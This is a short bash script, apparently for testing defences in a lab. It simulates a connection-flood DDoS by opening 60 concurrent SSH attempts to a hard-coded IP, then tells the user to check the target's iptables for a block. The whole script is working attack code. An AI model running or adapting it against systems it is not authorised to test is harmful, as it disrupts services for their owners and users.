#!/bin/bash
# DDoS Simulation script
# Run this from the Attacker Server to simulate a connection flood (DDoS) attack
# Target IP: 20.24.64.56 (Target Server)

TARGET_IP="20.24.64.56"

echo "=== Simulating Connection Flood DDoS Attack to Target: $TARGET_IP ==="
echo "Launching concurrent SSH connection attempts..."

for i in {1..60}; do
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 -o Port=22 fakeuser@$TARGET_IP >/dev/null 2>&1 &
done

echo "Launched 60 concurrent connection requests in the background."
echo "Check target server with 'sudo iptables -L INPUT -n' to see if attacker IP has been blocked."
